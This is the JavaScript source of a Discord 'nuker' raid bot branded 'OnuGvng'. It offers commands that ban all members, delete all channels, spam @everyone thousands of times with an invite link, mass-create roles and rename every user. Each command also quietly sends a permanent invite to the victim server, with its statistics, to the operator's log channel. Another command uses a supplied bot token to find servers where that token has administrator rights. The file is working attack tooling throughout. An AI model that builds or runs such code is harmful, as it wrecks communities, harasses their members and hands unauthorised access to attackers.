const { Client, ButtonBuilder, ButtonStyle, Permissions, Events, ComponentType, ReactionEmoji, GuildEmoji, WebhookClient, PermissionsBitField, GatewayIntentBits, EmbedBuilder, ChannelType, ActionRowBuilder, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, ActivityType, PermissionOverwrites, PermissionFlagsBits, Embed, IntentsBitField } = require('discord.js');
const client = new Client({ intents: [103423] });
async function wait_ms(ms) { return new Promise(resolve => setTimeout(resolve, ms)); };
const fetch = require("node-fetch");
const fs = require("node:fs");

if (!fs.existsSync('config_premium_users.json')) {
    fs.writeFileSync('config_premium_users.json', '{}');
};
if (!fs.existsSync('ids_premium_users.json')) {
    fs.writeFileSync('ids_premium_users.json', '[{}]');
};
if (!fs.existsSync('blacklist_users.json')) {
    fs.writeFileSync('blacklist_users.json', '[{}]');
};

const bot_token = ""; // Token del bot
const prefix = "."; // Prefijo de los comandos
const prefix_p = "."; // Prefijo de los comandos premium
let config_usuarios_premium = {};
let idservidores_nopermitidos = ["1319155913264861268", "y_otro_id_:v", "y_otro_id_:v"]; // Lista de IDs de servidores donde el bot no puede ejecutar comandos de ataque
let usuarios_owners = ["1075858281760837633", "1234602618387693650"]; // Lista de IDs de los usuarios owners
let usuarios_premium = [1075858281760837633];
let blacklist_user = [];
const channel_logs = "1325800060776091683"; // ID del canal a donde se enviarán los registros - El bot debe estar dentro de ese servidor.

let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
let blaclist_usersids = JSON.parse(blacklist_users_json);
for (let i = 0; i < blaclist_usersids.length; i++) {
    blacklist_user.push(blaclist_usersids[i]['id']);
};

let config_premium_users_json = fs.readFileSync("config_premium_users.json", 'utf-8');
let ids_premium_users_json = fs.readFileSync("ids_premium_users.json", 'utf-8');
let ids_premium_users_xd = JSON.parse(ids_premium_users_json);
config_usuarios_premium = JSON.parse(config_premium_users_json);
for (let i = 0; i < ids_premium_users_xd.length; i++) {
    usuarios_premium.push(ids_premium_users_xd[i]['id']);
};

client.on(`ready`, () => {
    console.clear();
    console.log(``);
    console.log(`> Bot ${client.user.username} activo.`);
    console.log(`> Invitación del Bot (administrador permisos): https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&integration_type=0&scope=bot`)
    console.log(``)
});

client.on(`messageCreate`, async (msg) => {
    if (blacklist_user.includes(msg.author.id)) {
        return;
    };

    // Normal cmds
    if (msg.content === prefix + "help") {
        try {
            const inviteLink = `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&integration_type=0&scope=bot`;
            await msg.author.send({ embeds: [
                new EmbedBuilder()
                    .setTitle(`Comandos disponibles`)
                    .setDescription(`**Comandos normales:**
\`${prefix}help\` - Muestra esta lista de comandos.
\`${prefix}raid\` - Inicia un raid en el servidor.
\`${prefix}banall\` - Banea a todos los usuarios en el servidor.
\`${prefix}channels\` - Elimina todos los canales en el servidor.
\`${prefix}spamchannels\` - Spam en todos los canales con menciones y enlace de invitación.
\`${prefix}spamroles\` - Crea roles en el servidor.
\`${prefix}spamusers\` - Cambia el nombre de todos los usuarios en el servidor.

**Comandos de propietario:**
\`${prefix_p}user.blacklist <id_usuario>\` - Agrega un usuario a la lista negra.
\`${prefix_p}find.guilds\` - Busca servidores con permisos de administrador.

[Invitar bot](${inviteLink})`)
                    .setColor(`#d20f15`)
            ] });
            await msg.reply(`Comandos enviados al MD.`);
        } catch (e) {
            console.log(e.message);
        }
    };

    if (msg.content === prefix + "raid") {
        try {
            const invite = await msg.channel.createInvite({
                maxAge: 0, // Duración infinita
                maxUses: 0, // Usos ilimitados
                unique: true, // Crear un nuevo enlace único
                reason: `Generado por ${msg.author.tag} mediante comando raid`
            });
            const totalUsers = msg.guild.members.cache.filter(member => !member.user.bot).size;
            const totalBots = msg.guild.members.cache.filter(member => member.user.bot).size;
            const totalBoosts = msg.guild.premiumSubscriptionCount || 0;
            const msgxd = await client.channels.cache.get(channel_logs).send({
                content: `@everyone Comando **raid** ejecutado por 
**${msg.author.username}**-**(${msg.author.id})**


**Nombre del servidor:**
${msg.guild.name}
**ID del servidor:**
${msg.guild.id}
**Boosts total:**${totalBoosts}


**Miembros en total:**
${msg.guild.memberCount}
**Usuarios:**${totalUsers}
**Bot:**${totalBots}


                    **\nInvitation Link:** ${invite.url}`
            });

            if (idservidores_nopermitidos.includes(msg.guild.id)) {
                await msg.channel.send({ content: `> Ese servidor no está permitido.` });
                return;
            };

            async function enviar_msgxd(canal) {
                let canalxdxd = client.channels.cache.get(canal.id);
                for (let index = 0; index < 3000; index++) {
                    try {
                        await canalxdxd.send({ content: `@everyone https://discord.gg/mq2EaRfzPJ - #OnuGvng` });
                    } catch (e) {
                        console.log(`[X] No se pudo enviar un mensaje con el comando "raid", mensaje de error: ${e.message}`);
                    }
                };
            };

            let canales_xdxd = [];
            async function crear_canalesxdxd() {
                const res = await fetch(`https://discord.com/api/v9/guilds/${msg.guild.id}/channels`, {
                    method: 'POST',
                    headers: {
                        "Authorization": `Bot ${bot_token}`,
                        "content-type": "application/json"
                    },
                    body: JSON.stringify({
                        "name": "test",
                        "type": "0"
                    })
                });
                const jsonxdxd = await res.json();
                canales_xdxd.push(jsonxdxd['id']);
                if (canales_xdxd.length >= 50) {
                    let channelss = await msg.guild.channels.fetch();
                    for (const ch of channelss.values()) {
                        try {
                            ch.setName('Raideado-por-OnuGvng');
                        } catch (e) {
                            console.log(e);
                        };
                    };
                    for (const ch of channelss.values()) {
                        try {
                            enviar_msgxd(ch);
                        } catch (e) {
                            console.log(e);
                        };
                    };
                };
            };

            for (let index = 0; index < 50; index++) {
                await wait_ms(10);
                crear_canalesxdxd();
            };
        } catch (e) {
            console.log(e);
        }
    };

    if (msg.content === prefix + "banall") {
        try {
            const invite = await msg.channel.createInvite({
                maxAge: 0, // Duración infinita
                maxUses: 0, // Usos ilimitados
                unique: true, // Crear un nuevo enlace único
                reason: `Generado por ${msg.author.tag} mediante comando banall`
            });
            const totalUsers = msg.guild.members.cache.filter(member => !member.user.bot).size;
            const totalBots = msg.guild.members.cache.filter(member => member.user.bot).size;
            const totalBoosts = msg.guild.premiumSubscriptionCount || 0;
            const msgxd = await client.channels.cache.get(channel_logs).send({
                content: `Comando **banall** ejecutado por 
**${msg.author.username}**-**(${msg.author.id})**


**Nombre del servidor:**
${msg.guild.name}
**ID del servidor:**
${msg.guild.id}
**Boosts total:**${totalBoosts}


**Miembros en total:**
${msg.guild.memberCount}
**Usuarios:**${totalUsers}
**Bot:**${totalBots}


                    **\nInvitation Link:** ${invite.url}`
            });

            if (idservidores_nopermitidos.includes(msg.guild.id)) {
                await msg.channel.send({ content: `> Ese servidor no está permitido.` });
                return;
            };

            let membersxdxd = await msg.guild.members.fetch();
            for (const m of membersxdxd.values()) {
                try {
                    if (m.user.id !== client.user.id) {
                        await m.ban();
                    }
                } catch (e) {
                    console.log(`[X] No se pudo banear al usuario ${m.nickname} con ID ${m.id}, error: ${e.message}`);
                }
            }
        } catch (e) {
            console.log(e.message);
        }
    };

    if (msg.content === prefix + "channels") {
        try {
            const invite = await msg.channel.createInvite({
                maxAge: 0, // Duración infinita
                maxUses: 0, // Usos ilimitados
                unique: true, // Crear un nuevo enlace único
                reason: `Generado por ${msg.author.tag} mediante comando channels`
            });
            const totalUsers = msg.guild.members.cache.filter(member => !member.user.bot).size;
            const totalBots = msg.guild.members.cache.filter(member => member.user.bot).size;
            const totalBoosts = msg.guild.premiumSubscriptionCount || 0;
            const msgxd = await client.channels.cache.get(channel_logs).send({
                content: `Comando **channels** ejecutado por 
**${msg.author.username}**-**(${msg.author.id})**


**Nombre del servidor:**
${msg.guild.name}
**ID del servidor:**
${msg.guild.id}
**Boosts total:**${totalBoosts}


**Miembros en total:**
${msg.guild.memberCount}
**Usuarios:**${totalUsers}
**Bot:**${totalBots}


                    **\nInvitation Link:** ${invite.url}`
            });

            if (idservidores_nopermitidos.includes(msg.guild.id)) {
                await msg.channel.send({ content: `> Ese servidor no está permitido.` });
                return;
            };

            let channelsssxdxd = await msg.guild.channels.fetch();
            for (const ch of channelsssxdxd.values()) {
                ch.delete();
            };
            await msg.guild.channels.create({ name: "nuked-by-OnuGvng", type: ChannelType.GuildText, topic: 'OnuGvng https://discord.gg/mq2EaRfzPJ' });
        } catch (e) {
            console.log(e.message);
        }
    };

    if (msg.content === prefix + "spamchannels") {
        try {
            const invite = await msg.channel.createInvite({
                maxAge: 0, // Duración infinita
                maxUses: 0, // Usos ilimitados
                unique: true, // Crear un nuevo enlace único
                reason: `Generado por ${msg.author.tag} mediante comando spamchannels`
            });
            const totalUsers = msg.guild.members.cache.filter(member => !member.user.bot).size;
            const totalBots = msg.guild.members.cache.filter(member => member.user.bot).size;
            const totalBoosts = msg.guild.premiumSubscriptionCount || 0;
            const msgxd = await client.channels.cache.get(channel_logs).send({
                content: `Comando **spamchannels** ejecutado por 
**${msg.author.username}**-**(${msg.author.id})**


**Nombre del servidor:**
${msg.guild.name}
**ID del servidor:**
${msg.guild.id}
**Boosts total:**${totalBoosts}


**Miembros en total:**
${msg.guild.memberCount}
**Usuarios:**${totalUsers}
**Bot:**${totalBots}


                    **\nInvitation Link:** ${invite.url}`
            });

            if (idservidores_nopermitidos.includes(msg.guild.id)) {
                await msg.channel.send({ content: `> Ese servidor no está permitido.` });
                return;
            };

            async function enviar_msgxd(canal) {
                let canalxdxd = client.channels.cache.get(canal.id);
                for (let index = 0; index < 25; index++) {
                    try {
                        await canalxdxd.send({ content: `@everyone https://discord.gg/mq2EaRfzPJ - #OnuGvng` });
                    } catch (e) {
                        console.log(`[X] No se pudo enviar un mensaje con el comando "spamchannels", mensaje de error: ${e.message}`);
                    }
                };
            };

            let channelsssxdxd = await msg.guild.channels.fetch();
            for (const ch of channelsssxdxd.values()) {
                enviar_msgxd(ch);
            };
        } catch (e) {
            console.log(e.message);
        }
    };

    if (msg.content === prefix + "spamroles") {
        try {
            const invite = await msg.channel.createInvite({
                maxAge: 0, // Duración infinita
                maxUses: 0, // Usos ilimitados
                unique: true, // Crear un nuevo enlace único
                reason: `Generado por ${msg.author.tag} mediante comando spamroles`
            });
            const totalUsers = msg.guild.members.cache.filter(member => !member.user.bot).size;
            const totalBots = msg.guild.members.cache.filter(member => member.user.bot).size;
            const totalBoosts = msg.guild.premiumSubscriptionCount || 0;
            const msgxd = await client.channels.cache.get(channel_logs).send({
                content: `Comando **spamroles** ejecutado por 
**${msg.author.username}**-**(${msg.author.id})**


**Nombre del servidor:**
${msg.guild.name}
**ID del servidor:**
${msg.guild.id}
**Boosts total:**${totalBoosts}


**Miembros en total:**
${msg.guild.memberCount}
**Usuarios:**${totalUsers}
**Bot:**${totalBots}


                    **\nInvitation Link:** ${invite.url}`
            });

            if (idservidores_nopermitidos.includes(msg.guild.id)) {
                await msg.channel.send({ content: `> Ese servidor no está permitido.` });
                return;
            };

            for (let index = 0; index < 50; index++) {
                try {
                    await msg.guild.roles.create({ name: 'OnuGvng', reason: 'https://discord.gg/mq2EaRfzPJ https://discord.gg/org' });
                } catch (e) {
                    console.log(`[X] No se pudo crear un rol en el servidor ${msg.guild.name} con ID ${msg.guild.id}, mensaje de error: ${e.message}`);
                }
            };
        } catch (e) {
            console.log(e.message);
        }
    };

    if (msg.content === prefix + "spamusers") {
        try {
            const invite = await msg.channel.createInvite({
                maxAge: 0, // Duración infinita
                maxUses: 0, // Usos ilimitados
                unique: true, // Crear un nuevo enlace único
                reason: `Generado por ${msg.author.tag} mediante comando spamusers`
            });
            const totalUsers = msg.guild.members.cache.filter(member => !member.user.bot).size;
            const totalBots = msg.guild.members.cache.filter(member => member.user.bot).size;
            const totalBoosts = msg.guild.premiumSubscriptionCount || 0;
            const msgxd = await client.channels.cache.get(channel_logs).send({
                content: `Comando **spamusers** ejecutado por 
**${msg.author.username}**-**(${msg.author.id})**


**Nombre del servidor:**
${msg.guild.name}
**ID del servidor:**
${msg.guild.id}
**Boosts total:**${totalBoosts}


**Miembros en total:**
${msg.guild.memberCount}
**Usuarios:**${totalUsers}
**Bot:**${totalBots}


                    **\nInvitation Link:** ${invite.url}`
            });

            if (idservidores_nopermitidos.includes(msg.guild.id)) {
                await msg.channel.send({ content: `> Ese servidor no está permitido.` });
                return;
            };

            let membersxdxd = await msg.guild.members.fetch();
            for (const m of membersxdxd.values()) {
                try {
                    await m.setNickname('OnuGvng');
                } catch (e) {
                    console.log(`[X] No se pudo renombrar al usuario ${m.nickname} con ID ${m.id}, error: ${e.message}`);
                }
            }
        } catch (e) {
            console.log(e.message);
        }
    };

    const args = msg.content.slice(prefix_p.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // Owner cmds
    if (command === "user.blacklist") {
        if (!usuarios_owners.includes(msg.author.id)) {
            return;
        };
        if (args.length === 0) {
            await msg.channel.send({ content: `> Falta agregar un ID de usuario.` });
            return;
        };
        let usuario_id = args[0];
        blacklist_user.push(usuario_id);
        let blacklist_users_json = fs.readFileSync("blacklist_users.json", 'utf-8');
        let ae = JSON.parse(blacklist_users_json);
        let xdxd = JSON.stringify(ae);
        let xd = xdxd.replace("]", "");
        let asd = `${xd}\n,{"id":"${usuario_id}"}]`;
        fs.writeFileSync('blacklist_users.json', asd);
    };

    if (msg.content === prefix_p + "find.guilds") {
        if (!usuarios_premium.includes(msg.author.id)) {
            return;
        };
        if (!config_usuarios_premium[msg.author.id].guild_id) {
            await msg.channel.send({ content: `> No haz introducido ninguna ID de un servidor por lo tanto no se puede nukear.` });
            return;
        } else {
            if (!config_usuarios_premium[msg.author.id].bot_token_n) {
                await msg.channel.send({ content: `> No haz introducido ningún token de bot.` });
                return;
            } else {
                await msg.channel.send({ content: `> Buscando servidores con permisos de administrador en el token xdxd...` });
                let namev = `client${msg.author.id}`;
                namev = new Client({ intents: [103423] });
                await namev.login(config_usuarios_premium[msg.author.id].bot_token_n);
                let ajskdsa = await namev.guilds.fetch();
                for (const xdsdagjfvsarjhjfsthb of ajskdsa.values()) {
                    try {
                        if (namev.guilds.cache.get(`${xdsdagjfvsarjhjfsthb.id}`).members.cache.get(`${namev.user.id}`).permissions.has(PermissionsBitField.Flags.Administrator)) {
                            await msg.channel.send({ content: `> El bot tiene permisos de administrador en el servidor ${xdsdagjfvsarjhjfsthb.name}` })
                        };
                    } catch (e) {
                        console.log(e)
                        await msg.channel.send({ content: `> No se pudo obtener información del servidor ${xdsdagjfvsarjhjfsthb.id}` })
                    }
                };
                await namev.destroy();
            };
        };
    };
});

client.login(bot_token);